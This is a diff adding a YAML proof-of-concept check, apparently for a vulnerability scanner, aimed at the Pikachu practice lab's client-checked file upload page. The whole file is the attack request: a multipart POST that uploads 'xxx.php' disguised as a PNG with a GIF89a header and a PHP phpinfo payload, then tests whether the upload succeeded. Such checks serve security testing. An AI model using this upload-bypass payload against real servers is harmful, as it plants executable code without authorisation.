@@ -1,0 +1,25 @@
+name: poc-yaml-pikachu-upload.yaml
+rules:
+  - method: POST
+    path: "/pikachu/vul/unsafeupload/clientcheck.php"
+    headers: 
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+      Content-Type: multipart/form-data; boundary=---------------------------165074099613736077223692041763
+    body: |
+      -----------------------------165074099613736077223692041763
+      Content-Disposition: form-data; name="uploadfile"; filename="xxx.php"
+      Content-Type: image/png
+
+      GIF89a
+      <?php phpinfo();?>
+      -----------------------------165074099613736077223692041763
+      Content-Disposition: form-data; name="submit"
+
+      开始上传
+      -----------------------------165074099613736077223692041763--
+    expression: |
+      response.status == 200 && response.body.bcontains(b'uploads')
+detail:
+  author: xxx
+  links:
+    - https://www.bilibili.com/video/BV19b4y1p7QN
